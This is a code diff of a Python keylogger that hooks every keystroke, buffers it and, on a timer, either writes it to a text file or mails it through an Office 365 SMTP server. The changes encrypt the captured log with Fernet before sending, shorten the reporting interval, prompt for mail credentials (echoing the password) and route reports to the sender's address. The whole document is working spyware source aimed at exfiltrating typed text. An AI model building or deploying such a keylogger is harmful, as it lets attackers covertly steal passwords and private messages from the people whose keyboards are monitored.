@@ -4,8 +4,13 @@ from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from cryptography.fernet import Fernet
+import getpass
+encrption_key = Fernet.generate_key()
+cpiher_suite = Fernet(encrption_key)
+plaintext = ""
 
-SEND_REPORT_EVERY = 30 # Time after which email/keylogger logs are saved in file/ forwarded to email
+SEND_REPORT_EVERY = 10 # Time after which email/keylogger logs are saved in file/ forwarded to email
 EMAIL_ADDRESS = "Your_email_address"
 EMAIL_PASSWORD = "Your_email_password"
 RECIVING_ADDRESS = "recipient_email_address"
@@ -17,14 +22,15 @@ class Keylogger:
         self.log = ""
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
-    
+
     def callback(self,event):
         name = event.name
+        print(name)
         if len(name) > 1:
             if name == "space":
                 name = " "
             elif name == "enter":
-                name = "[ENTER]\n"
+                name = "\n"
             elif name == "decimal":
                 name = "."
             else :
@@ -41,11 +47,12 @@ class Keylogger:
         with open(f"{self.filename}.txt","w") as  f: # file will be saved in the current directory
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+        # print(self.log)
     
     def prepare_mail(self,message):
         msg = MIMEMultipart("alternative")
         msg["From"] = EMAIL_ADDRESS
-        msg["To"] = RECIVING_ADDRESS # for getting mail at your mail only keep reciving  address same as emailing address
+        msg["To"] = EMAIL_ADDRESS # for getting mail at your mail only keep reciving  address same as emailing address
         msg["Subject"] = "Keylogger Logs"
         html = f"<p>{message}</p>"
         text_part = MIMEText(message,"plain")
@@ -58,8 +65,8 @@ class Keylogger:
         server = smtplib.SMTP(host="smtp.office365.com",port=587)
         server.starttls()
         server.login(email,password)
+        print(message)
         server.sendmail(email,email,self.prepare_mail(message=message))
-
         server.quit()
 
         if verbose :
@@ -72,7 +79,10 @@ class Keylogger:
             self.update_filename()
 
             if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,self.log)
+                plaintext = self.log
+                encrpyt_text = cpiher_suite.encrypt(plaintext.encode())
+                # print(encrpyt_text)
+                self.sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,encrpyt_text)
             elif self.report_method == "file":
                 self.report_to_file()
 
@@ -91,7 +101,26 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email") # by entering report_method="file" logs will be save in your execting directory
+    print("press 1 : for email\npress 2 : for local storage")
+    n = int(input())
+    report_method = ""
+    if n == 1:
+        report_method = "email"
+        email = input("Enter Sender Email Address : ")
+        password = getpass.getpass("Enter your password : ")
+        print(password)
+        remail = input("Enter recipient Email address : ")
+        EMAIL_ADDRESS = email
+        EMAIL_PASSWORD = password
+        RECIVING_ADDRESS = remail
+    elif n == 2:
+        report_method = "file"
+    # elif n == 3:
+    #     encrypt_text = input("Enter the text : ")
+    #     print("encrypt text : " + encrypt_text)
+    #     decrypt_message = cpiher_suite.decrypt(encrypt_text).decode()
+    #     print("decypt text : " + decrypt_message)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method=report_method) # by entering report_method="file" logs will be save in your execting directory
     keylogger.start()
 
 
